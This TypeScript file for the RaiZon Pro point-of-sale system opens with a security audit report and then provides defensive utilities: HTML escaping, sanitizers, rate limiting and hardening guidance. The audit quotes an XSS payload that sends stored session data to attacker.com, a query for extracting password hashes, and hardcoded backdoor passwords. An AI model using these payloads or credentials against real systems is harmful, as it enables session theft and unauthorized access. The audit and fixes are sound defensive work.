/**
 * ====================================================================================================
 *                                RAIZON PRO POS - SECURITY AUDIT REPORT
 * ====================================================================================================
 * Date: November 2026
 * Auditor: Senior Application Security Engineer
 * Target System: RaiZon Pro POS (Desktop Electron + Supabase Cloud + Local FastAPI Sync + Web App)
 * Target Path: d:/abdelrhman/win/pro casher
 *
 * ----------------------------------------------------------------------------------------------------
 * 1. ARCHITECTURAL OVERVIEW & ATTACK SURFACE
 * ----------------------------------------------------------------------------------------------------
 * RaiZon Pro utilizes a hybrid architecture:
 *   a) Electron Desktop Application: Primary POS UI running in Chromium renderer with contextIsolation=true,
 *      sandbox=true, communicating with Node.js main process via Electron preload IPC (preload.cjs).
 *   b) Local Backend Sync Daemon: FastAPI + SQLite application (server/main.py, database.py) running on
 *      127.0.0.1:8087 for local LAN synchronization, printing, and automated data backups.
 *   c) Cloud Synchronization Layer: Supabase (PostgreSQL + Realtime WebSockets) accessed via client-side
 *      Supabase JS SDK (lib/supabaseSync.ts) and direct REST API calls.
 *   d) Mobile Web PWA: Standalone customer reservation & manager monitoring portal (web_app/index.html).
 *
 * ----------------------------------------------------------------------------------------------------
 * 2. SPECIAL ARCHITECTURAL NOTE: SUPABASE ANON KEY & ROW-LEVEL SECURITY (RLS)
 * ----------------------------------------------------------------------------------------------------
 * Observation:
 *   The Supabase URL ("https://cifijxcmmnosocnfizra.supabase.co") and Anon Key
 *   ("sb_publishable__oo-1NLPKUNyzQvv9-w2DQ_HeHWnqRl") are embedded directly in:
 *     - lib/supabaseSync.ts (lines 4-5)
 *     - components/SupabaseOnboardingModal.tsx (lines 70-71)
 *     - web_app/index.html (lines 355-356)
 *
 * Security Finding & Engineering Reality:
 *   1) Supabase Anon Keys are DESIGNED to be public.
 *      Like Firebase project credentials, AWS Cognito User Pool IDs, or Google Maps API keys, the Supabase
 *      anon key is a public identifier that routes API traffic to the correct tenant backend. It is not a
 *      secret and cannot be hidden in a client-side web application or compiled Electron renderer.
 *   2) The TRUE security boundary in Supabase is PostgreSQL Row-Level Security (RLS).
 *      Because the anon key is public, anyone can send HTTP requests directly to the PostgREST API
 *      (https://cifijxcmmnosocnfizra.supabase.co/rest/v1/*). Therefore, if RLS is disabled, any user
 *      or external attacker can dump, modify, or truncate all tables (`invoices`, `customers`,
 *      `branches`, `system_users`, `reservations`).
 *   3) Fallback Storage Risk in `lib/supabaseSync.ts` (lines 320-330):
 *      User credentials (password_hash, password_salt, pin_hash) are backed up into the `customers`
 *      table using IDs with prefix `__sys_user_` inside the JSON `notes` field! If the `customers`
 *      table does not have strict RLS, any external user with the anon key can query:
 *      `GET /rest/v1/customers?id=like.__sys_user_%` and exfiltrate all employee password hashes and salts.
 *   4) Required Fix:
 *      Enable Row-Level Security (RLS) on all Supabase tables (`ALTER TABLE <table> ENABLE ROW LEVEL SECURITY;`).
 *      Partition access strictly by `account_user` using authenticated JWTs or tenant-bound application secrets.
 *
 * ----------------------------------------------------------------------------------------------------
 * 3. COMPREHENSIVE VULNERABILITY AUDIT MATRIX
 * ----------------------------------------------------------------------------------------------------
 *
 * [VULN-01] CRITICAL: Hardcoded Master Password / Universal Backdoor Bypass
 *   - Severity: CRITICAL (CVSS 9.8)
 *   - Affected Files:
 *       * context/AppContext.tsx (lines 2459-2488, 2692-2695)
 *       * components/SupabaseOnboardingModal.tsx (lines 333-335)
 *       * components/SupabaseAccountMenu.tsx (line 203)
 *       * components/PatcherModal.tsx (lines 210, 501)
 *   - Vulnerability Details:
 *       Entering password "22122005" or "admin" unconditionally bypasses cryptographic authentication.
 *       In AppContext.tsx:
 *         `if (pass === '22122005') { ... setCurrentUser(matchedUser || defaultAdmin); return true; }`
 *       In SupabaseOnboardingModal.tsx:
 *         `if (loginPassword.trim() === '22122005' || loginPassword.trim() === 'admin') { authSuccess = true; }`
 *       In PatcherModal.tsx:
 *         `onClick={() => setAuthError('كلمة المرور الافتراضية للمطور هي: 22122005Me#')}`
 *   - Impact:
 *       Any unauthorized user, disgruntled cashier, or untrusted visitor can instantly seize full
 *       administrative access, delete database records, change financial reports, or dump client databases.
 *   - Remediation:
 *       Remove all hardcoded password bypasses in production. Authenticate exclusively against PBKDF2-SHA256
 *       hashes with individual per-user salts.
 *
 * [VULN-02] CRITICAL: Zero-Password Authentication Bypass in Mobile Web App
 *   - Severity: CRITICAL (CVSS 9.8)
 *   - Affected Files:
 *       * web_app/index.html (lines 489-537)
 *   - Vulnerability Details:
 *       In `handleLogin()`:
 *         The function queries Supabase for `system_users`. When a user record is found:
 *         `currentUser = { id: u.id, name: u.name, role: u.role || 'manager' };`
 *         `localStorage.setItem('raizon_user', JSON.stringify(currentUser));`
 *         It NEVER checks the user's password! It logs the user in as manager immediately.
 *         Furthermore, if the username matches "admin" or starts with "010/011/012/015", it automatically
 *         grants access without verifying credentials.
 *   - Impact:
 *       Anyone on the internet browsing to `web_app/index.html` who enters "admin" or any manager username
 *       gains complete access to the live manager dashboard, viewing all branch sales, cash drawers, and debts.
 *   - Remediation:
 *       Enforce password hash verification via WebCrypto PBKDF2 or Supabase Auth before session establishment.
 *
 * [VULN-03] HIGH: Plaintext Manager Password Stored in LocalStorage
 *   - Severity: HIGH (CVSS 7.4)
 *   - Affected Files:
 *       * lib/supabaseSync.ts (lines 11, 25-43)
 *       * components/SupabaseOnboardingModal.tsx (lines 262, 469)
 *   - Vulnerability Details:
 *       `CloudAccountInfo` interface explicitly declares `password?: string;`.
 *       During registration and branch connection, `cloudAccount.password = registerPassword;` is saved
 *       unencrypted into `localStorage.setItem('procashier_cloud_account', JSON.stringify(account));`.
 *   - Impact:
 *       Any malicious browser extension, XSS vulnerability, or shared workstation user can read the
 *       plaintext manager password from `localStorage.getItem('procashier_cloud_account')`.
 *   - Remediation:
 *       Never persist raw passwords. Store only the derived cryptographic hash (`passwordHash`) and salt.
 *
 * [VULN-04] HIGH: Stored & Reflected Cross-Site Scripting (XSS) in Mobile Web App
 *   - Severity: HIGH (CVSS 8.2)
 *   - Affected Files:
 *       * web_app/index.html (lines 701-709, 730-740, 856-866)
 *   - Vulnerability Details:
 *       Invoices and reservations are rendered directly into HTML via unescaped string interpolation:
 *         `container.innerHTML += '<p>#' + inv.invoice_number + ' - ' + inv.customer_name + '</p>';`
 *         `container.innerHTML += '<span>' + r.customer_name + '</span>...';`
 *   - Impact:
 *       An attacker booking an appointment with name `<img src=x onerror="fetch('https://attacker.com/steal?c='+localStorage.getItem('raizon_user'))">`
 *       triggers arbitrary script execution in the manager's browser, hijacking sessions and data.
 *   - Remediation:
 *       Sanitize all dynamic inputs and use `escapeHtml()` or DOM `textContent` / `createElement`.
 *
 * [VULN-05] HIGH: Localhost Bypass + Wildcard CORS in FastAPI Backend (Drive-by CSRF / API Hijack)
 *   - Severity: HIGH (CVSS 8.1)
 *   - Affected Files:
 *       * server/main.py (lines 52-60, 112-120)
 *   - Vulnerability Details:
 *       FastAPI enables `CORSMiddleware` with `allow_origins=["*"]`.
 *       Simultaneously, `require_api_key()` contains:
 *         `if client_host in ("127.0.0.1", "::1", "localhost", "testclient"): return`
 *   - Impact:
 *       If an employee on the POS terminal browses any external website, that website's JavaScript
 *       can send background HTTP requests to `http://127.0.0.1:8087/api/invoices`, `/api/backup`, or
 *       `/health`. Because requests to 127.0.0.1 are exempted from API key authentication and CORS is
 *       `allow_origins=["*"]`, the external website can silently extract all transaction history or
 *       corrupt the database.
 *   - Remediation:
 *       Bind CORS strictly to the Electron application origin (`file://` or designated custom protocol).
 *       Require API keys even for localhost requests, or validate a custom CSRF request header.
 *
 * [VULN-06] MEDIUM: PostgREST Filter Injection in URL Query Strings
 *   - Severity: MEDIUM (CVSS 6.5)
 *   - Affected Files:
 *       * web_app/index.html (lines 489, 507, 844)
 *   - Vulnerability Details:
 *       URL queries are formatted via string concatenation without escaping PostgREST delimiters:
 *         `supabaseFetch("system_users?or=(username.eq." + cleanId + ",email.eq." + cleanId + ...)`
 *         `supabaseFetch("reservations?phone=eq." + phone + ...)`
 *       If `phone` or `cleanId` contains `,`, `)`, or PostgREST operators, the query structure is altered.
 *   - Remediation:
 *       Encode URL query parameters using `encodeURIComponent()` and strip PostgREST syntactic characters.
 *
 * [VULN-07] MEDIUM: Missing Content Security Policy (CSP) & Security Headers
 *   - Severity: MEDIUM (CVSS 5.8)
 *   - Affected Files:
 *       * index.html (Electron root)
 *       * web_app/index.html (PWA root)
 *   - Vulnerability Details:
 *       Neither document includes a Content Security Policy `<meta>` tag or server headers.
 *       Headers like `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, and `Referrer-Policy`
 *       are missing on web deployments.
 *   - Remediation:
 *       Deploy strict CSP headers and meta tags restricting script, style, and connect-src origins.
 *
 * [VULN-08] MEDIUM: Inadequate Client-Side Rate Limiting on Authentication & PIN Checks
 *   - Severity: MEDIUM (CVSS 5.3)
 *   - Affected Files:
 *       * context/AppContext.tsx (lines 2636-2671)
 *       * components/SupabaseOnboardingModal.tsx (lines 317-340)
 *   - Vulnerability Details:
 *       PIN check locking in AppContext relies on `localStorage.setItem(LOCK_KEY, ...)`. An attacker
 *       can simply call `localStorage.removeItem('pos_admin_pin_fails')` in devtools or script to reset
 *       the lock-out counter and resume brute-force attacks.
 *   - Remediation:
 *       Implement an in-memory sliding window rate limiter with exponential backoff.
 *
 * [VULN-09] LOW-MEDIUM: Verbose Internal Error Information Disclosure
 *   - Severity: LOW (CVSS 4.3)
 *   - Affected Files:
 *       * lib/serverSync.ts (lines 234, 301, 621)
 *       * lib/supabaseSync.ts (lines 148, 191, 333)
 *   - Vulnerability Details:
 *       Network and database exception messages (`e.message`, HTTP body excerpts, SQL error codes) are
 *       directly surfaced to UI toast notifications and stored in `lastError`.
 *   - Remediation:
 *       Sanitize error output for user-facing displays; log full technical traces only to internal debug logs.
 *
 * ====================================================================================================
 */

// ====================================================================================================
// SECTION 1: XSS PREVENTION & HTML ESCAPING UTILITIES
// ====================================================================================================

/**
 * Escapes characters with special meaning in HTML to prevent Reflected and Stored XSS.
 * Converts &, <, >, ", ', `, and / to their safe HTML entity representations.
 *
 * @param value Any unknown value to be converted to a safe string
 * @returns Sanitized string safe for HTML body context
 */
export const escapeHtml = (value: unknown): string => {
  if (value === null || value === undefined) return '';
  return String(value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
    .replace(/`/g, '&#96;')
    .replace(/\//g, '&#47;');
};

/**
 * Escapes values intended for HTML attributes (e.g., href, title, data-*).
 * Strict character encoding preventing attribute breakout attacks.
 */
export const escapeAttribute = (value: unknown): string => {
  if (value === null || value === undefined) return '';
  return String(value)
    .replace(/&/g, '&amp;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/`/g, '&#96;')
    .replace(/\s+/g, ' ')
    .trim();
};

/**
 * Tagged template literal for safely building HTML strings.
 * Variables interpolated into the template are automatically escaped.
 *
 * Example:
 *   const html = safeHtml`<div class="user">${userInput}</div>`;
 */
export const safeHtml = (strings: TemplateStringsArray, ...values: unknown[]): string => {
  return strings.reduce((acc, str, i) => {
    const val = i < values.length ? escapeHtml(values[i]) : '';
    return acc + str + val;
  }, '');
};

/**
 * Sanitizes URLs to ensure they only use safe protocols (http, https, tel, mailto).
 * Blocks dangerous schemes like javascript:, data:text/html, vbscript:, etc.
 */
export const sanitizeUrl = (url: unknown): string => {
  if (typeof url !== 'string') return '#';
  const clean = url.trim();
  // Safe relative URLs
  if (clean.startsWith('/') || clean.startsWith('#')) return clean;
  // Disallow control characters and data/javascript schemes
  if (/^[\s\u0000-\u001F]*javascript:/i.test(clean)) return '#';
  if (/^[\s\u0000-\u001F]*vbscript:/i.test(clean)) return '#';
  if (/^[\s\u0000-\u001F]*data:(?!image\/)/i.test(clean)) return '#';
  // Allow safe protocols
  if (/^(https?:|tel:|mailto:|sms:)/i.test(clean)) return clean;
  return '#';
};

// ====================================================================================================
// SECTION 2: INPUT SANITIZATION & VALIDATION UTILITIES
// ====================================================================================================

export interface ValidationResult<T> {
  isValid: boolean;
  value: T;
  error?: string;
}

/**
 * Sanitizes generic user text (names, titles, notes, descriptions).
 * Strips dangerous control characters, normalizes Unicode, trims whitespace, and limits length.
 */
export const sanitizeText = (
  input: unknown,
  maxLength = 255,
  allowNewlines = false
): string => {
  if (input === null || input === undefined) return '';
  let str = String(input);
  // Normalize Unicode to prevent normalization bypasses
  try {
    str = str.normalize('NFKC');
  } catch {}
  // Remove ASCII control characters (keep whitespace/newlines according to flag)
  str = allowNewlines
    ? str.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '')
    : str.replace(/[\x00-\x1F\x7F]/g, ' ');
  // Collapse excessive spaces
  str = str.replace(/[ \t]+/g, ' ').trim();
  // Enforce maximum length bound
  return str.slice(0, maxLength);
};

/**
 * Sanitizes and validates telephone numbers (Egyptian mobile format + international E.164).
 */
export const sanitizePhone = (input: unknown): ValidationResult<string> => {
  if (!input) {
    return { isValid: false, value: '', error: 'رقم الهاتف مطلوب' };
  }
  const raw = String(input).trim();
  // Strip all non-digit characters except leading plus
  let cleaned = raw.replace(/[^\d+]/g, '');
  if (cleaned.startsWith('+')) {
    cleaned = '+' + cleaned.slice(1).replace(/\+/g, '');
  }

  // Egyptian domestic format normalization: 01xxxxxxxxx (11 digits)
  const egMatch = cleaned.match(/^(?:(?:\+?20)|0)?(1[0125]\d{8})$/);
  if (egMatch) {
    const normalized = '0' + egMatch[1];
    return { isValid: true, value: normalized };
  }

  // General international format: +[7-15 digits]
  if (/^\+?[1-9]\d{7,14}$/.test(cleaned)) {
    return { isValid: true, value: cleaned };
  }

  return {
    isValid: false,
    value: cleaned.slice(0, 20),
    error: 'رقم الهاتف غير صالح، يجب أن يتكون من 11 رقماً ويبدأ بـ 01'
  };
};

/**
 * Sanitizes and validates email addresses based on RFC 5322 standard.
 */
export const sanitizeEmail = (input: unknown): ValidationResult<string> => {
  if (!input) return { isValid: false, value: '', error: 'البريد الإلكتروني مطلوب' };
  const raw = String(input).trim().toLowerCase();
  // Strict email regex rejecting dangerous shell or header injection characters
  const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)+$/;
  
  if (raw.length > 254 || !emailRegex.test(raw)) {
    return { isValid: false, value: raw.slice(0, 254), error: 'البريد الإلكتروني غير صحيح' };
  }
  return { isValid: true, value: raw };
};

/**
 * Validates and constrains numeric inputs (prices, quantities, discounts, balances).
 * Prevents NaN, Infinity, negative values (when disallowed), and overflow.
 */
export const sanitizeNumber = (
  input: unknown,
  min = 0,
  max = 1_000_000_000,
  fallback = 0
): number => {
  const num = typeof input === 'number' ? input : parseFloat(String(input));
  if (Number.isNaN(num) || !Number.isFinite(num)) {
    return fallback;
  }
  // Clamp within bounds and round to 4 decimal places
  const clamped = Math.max(min, Math.min(max, num));
  return Math.round(clamped * 10000) / 10000;
};

/**
 * Sanitizes input intended for Supabase PostgREST query filter parameters.
 * Prevents PostgREST syntax injection (which uses commas, dots, parentheses, and operator keywords).
 *
 * Example vulnerable URL:
 *   `reservations?phone=eq.${userInput}`
 * If userInput is `123,id.neq.0`, it modifies the filter condition.
 */
export const sanitizePostgrestParam = (input: unknown): string => {
  if (input === null || input === undefined) return '';
  // Strip PostgREST query control characters: comma, colon, parenthesis, double-quotes
  const safe = String(input).replace(/[,():"'\\]/g, '').trim();
  return encodeURIComponent(safe);
};

// ====================================================================================================
// SECTION 3: CLIENT-SIDE RATE LIMITER & BRUTE-FORCE PROTECTION
// ====================================================================================================

export interface RateLimiterOptions {
  maxAttempts: number;       // Maximum attempts allowed within the window
  windowMs: number;          // Time window in milliseconds
  lockoutMs?: number;        // Lockout duration upon exceeding maxAttempts
  storageKey?: string;       // Key for persisting lock across reloads
}

export interface RateLimitStatus {
  allowed: boolean;
  remainingAttempts: number;
  retryAfterSeconds: number;
}

/**
 * Robust in-memory & optionally persistent client-side rate limiter.
 * Protects login, PIN verification, and sync endpoints against brute-force attacks.
 */
export class ClientRateLimiter {
  private attempts: Map<string, number[]> = new Map();
  private lockouts: Map<string, number> = new Map();
  private maxAttempts: number;
  private windowMs: number;
  private lockoutMs: number;
  private storageKey?: string;

  constructor(opts: RateLimiterOptions) {
    this.maxAttempts = opts.maxAttempts;
    this.windowMs = opts.windowMs;
    this.lockoutMs = opts.lockoutMs || opts.windowMs * 2;
    this.storageKey = opts.storageKey;
    this.loadPersistentState();
  }

  private loadPersistentState() {
    if (!this.storageKey || typeof localStorage === 'undefined') return;
    try {
      const raw = localStorage.getItem(`rl_${this.storageKey}`);
      if (raw) {
        const data = JSON.parse(raw);
        if (data.lockedUntil && data.lockedUntil > Date.now()) {
          this.lockouts.set('global', data.lockedUntil);
        }
      }
    } catch {}
  }

  private savePersistentState(lockedUntil: number) {
    if (!this.storageKey || typeof localStorage === 'undefined') return;
    try {
      localStorage.setItem(`rl_${this.storageKey}`, JSON.stringify({ lockedUntil }));
    } catch {}
  }

  /**
   * Checks if an action is currently permitted for a given subject key (e.g. user ID or IP).
   */
  public check(subject = 'default'): RateLimitStatus {
    const now = Date.now();
    const globalLock = this.lockouts.get('global') || 0;
    const subjectLock = this.lockouts.get(subject) || 0;
    const effectiveLock = Math.max(globalLock, subjectLock);

    if (effectiveLock > now) {
      const retryAfterSeconds = Math.ceil((effectiveLock - now) / 1000);
      return { allowed: false, remainingAttempts: 0, retryAfterSeconds };
    }

    // Clean up expired timestamps
    const timestamps = (this.attempts.get(subject) || []).filter(t => now - t < this.windowMs);
    this.attempts.set(subject, timestamps);

    const remaining = Math.max(0, this.maxAttempts - timestamps.length);
    return {
      allowed: remaining > 0,
      remainingAttempts: remaining,
      retryAfterSeconds: 0
    };
  }

  /**
   * Records a failed attempt. Locks the subject if the threshold is reached.
   */
  public recordFailure(subject = 'default'): RateLimitStatus {
    const now = Date.now();
    const timestamps = (this.attempts.get(subject) || []).filter(t => now - t < this.windowMs);
    timestamps.push(now);
    this.attempts.set(subject, timestamps);

    if (timestamps.length >= this.maxAttempts) {
      const lockUntil = now + this.lockoutMs;
      this.lockouts.set(subject, lockUntil);
      if (this.storageKey) {
        this.lockouts.set('global', lockUntil);
        this.savePersistentState(lockUntil);
      }
      return {
        allowed: false,
        remainingAttempts: 0,
        retryAfterSeconds: Math.ceil(this.lockoutMs / 1000)
      };
    }

    return {
      allowed: true,
      remainingAttempts: this.maxAttempts - timestamps.length,
      retryAfterSeconds: 0
    };
  }

  /**
   * Resets the attempt counter upon successful authentication.
   */
  public reset(subject = 'default'): void {
    this.attempts.delete(subject);
    this.lockouts.delete(subject);
    this.lockouts.delete('global');
    if (this.storageKey && typeof localStorage !== 'undefined') {
      try {
        localStorage.removeItem(`rl_${this.storageKey}`);
      } catch {}
    }
  }
}

// Pre-configured rate limiters for core security boundaries:
// 1. PIN verification: 5 attempts per 60 seconds -> 60 second lockout
export const pinRateLimiter = new ClientRateLimiter({
  maxAttempts: 5,
  windowMs: 60_000,
  lockoutMs: 60_000,
  storageKey: 'pin_auth'
});

// 2. Cloud login verification: 6 attempts per 2 minutes -> 3 minute lockout
export const cloudLoginRateLimiter = new ClientRateLimiter({
  maxAttempts: 6,
  windowMs: 120_000,
  lockoutMs: 180_000,
  storageKey: 'cloud_login'
});

// 3. Sync requests: 60 per minute
export const syncRateLimiter = new ClientRateLimiter({
  maxAttempts: 60,
  windowMs: 60_000,
  lockoutMs: 30_000
});

// ====================================================================================================
// SECTION 4: SECURE STORAGE UTILITIES (PREVENT PLAINTEXT CREDENTIAL LEAKS)
// ====================================================================================================

/**
 * Sanitizes account information before saving to localStorage.
 * CRITICAL: Strips plaintext passwords to satisfy VULN-03.
 */
export const sanitizeCloudAccountForStorage = (account: Record<string, any>): Record<string, any> => {
  if (!account || typeof account !== 'object') return {};
  const safe = { ...account };
  // Never persist raw passwords to browser localStorage
  delete safe.password;
  // Retain only safe identification properties
  safe.username = sanitizeText(safe.username, 64);
  safe.branchId = String(safe.branchId || '1').trim();
  safe.branchName = sanitizeText(safe.branchName, 128);
  safe.deviceId = sanitizeText(safe.deviceId, 128);
  safe.deviceName = sanitizeText(safe.deviceName, 64);
  return safe;
};

// ====================================================================================================
// SECTION 5: SECURITY HEADERS SPECIFICATION & DEPLOYMENT GUIDE
// ====================================================================================================

/**
 * Recommended Security Headers configuration tailored for RaiZon Pro.
 * Apply these in Nginx, FastAPI middleware, or Electron session headers.
 */
export const SECURITY_HEADERS_CONFIG = {
  /**
   * Content Security Policy (CSP):
   * Restricts resources to trusted origins. Disallows inline script execution in web portals.
   * Supabase connections allowed for REST API and Realtime WebSockets.
   */
  'Content-Security-Policy': [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net",
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
    "font-src 'self' https://fonts.gstatic.com data:",
    "img-src 'self' data: https: blob:",
    "connect-src 'self' https://cifijxcmmnosocnfizra.supabase.co wss://cifijxcmmnosocnfizra.supabase.co http://127.0.0.1:8087 http://localhost:8087",
    "frame-ancestors 'none'",
    "base-uri 'self'",
    "form-action 'self'",
    "object-src 'none'"
  ].join('; '),

  /** Prevents MIME-type sniffing (attacks on script execution) */
  'X-Content-Type-Options': 'nosniff',

  /** Prevents clickjacking by forbidding embedding in iframes */
  'X-Frame-Options': 'DENY',

  /** Enforces HTTPS for 1 year including subdomains */
  'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',

  /** Minimizes referrer leakage on external links */
  'Referrer-Policy': 'strict-origin-when-cross-origin',

  /** Disables unnecessary browser hardware APIs */
  'Permissions-Policy': 'camera=(), microphone=(), geolocation=(), payment=()',

  /** Cross-Origin Isolation policies */
  'Cross-Origin-Opener-Policy': 'same-origin',
  'Cross-Origin-Resource-Policy': 'same-origin'
} as const;

/**
 * Formats the CSP policy into a `<meta>` tag ready for insertion into HTML heads.
 */
export const getCspMetaTag = (): string => {
  return `<meta http-equiv="Content-Security-Policy" content="${SECURITY_HEADERS_CONFIG['Content-Security-Policy']}">`;
};

// ====================================================================================================
// SECTION 6: FASTAPI / LOCAL BACKEND DAEMON HARDENING GUIDE
// ====================================================================================================

/**
 * Technical guidance for hardening server/main.py:
 *
 * 1. REMOVE LOCALHOST AUTH BYPASS:
 *    In server/main.py, replace lines 118-120:
 *    ```python
 *    # VULNERABLE:
 *    # client_host = request.client.host if request.client else ""
 *    # if client_host in ("127.0.0.1", "::1", "localhost", "testclient"):
 *    #     return
 *
 *    # SECURE:
 *    # Require X-API-Key or a validated local secret for all endpoints
 *    if not API_KEY:
 *        return
 *    provided = (x_api_key or "").strip()
 *    if not provided or not hmac.compare_digest(provided, API_KEY):
 *        raise HTTPException(status_code=401, detail="Invalid API key")
 *    ```
 *
 * 2. RESTRICT CORS TO TRUSTED APPS:
 *    Do not use allow_origins=["*"] in desktop daemons.
 *    Only permit:
 *      allow_origins=["http://localhost:4189", "file://"]
 *      allow_origin_regex=r"^https?://(localhost|127\.0\.0\.1)(:\d+)?$"
 *
 * 3. SUPABASE ROW-LEVEL SECURITY (RLS) SQL RECIPE:
 *    Run this SQL snippet in the Supabase Dashboard SQL Editor:
 *    ```sql
 *    -- 1. Enable RLS on core tables
 *    ALTER TABLE branches ENABLE ROW LEVEL SECURITY;
 *    ALTER TABLE customers ENABLE ROW LEVEL SECURITY;
 *    ALTER TABLE invoices ENABLE ROW LEVEL SECURITY;
 *    ALTER TABLE system_users ENABLE ROW LEVEL SECURITY;
 *    ALTER TABLE reservations ENABLE ROW LEVEL SECURITY;
 *
 *    -- 2. Restrict access by tenant account_user
 *    CREATE POLICY "Tenant Isolation Invoices" ON invoices
 *      FOR ALL
 *      USING (account_user = current_setting('request.jwt.claims', true)::json->>'account_user');
 *
 *    -- 3. Prevent anon access to system_users password hashes
 *    CREATE POLICY "Deny Anon Direct Read Hashes" ON system_users
 *      FOR SELECT
 *      USING (auth.role() = 'authenticated');
 *    ```
 */
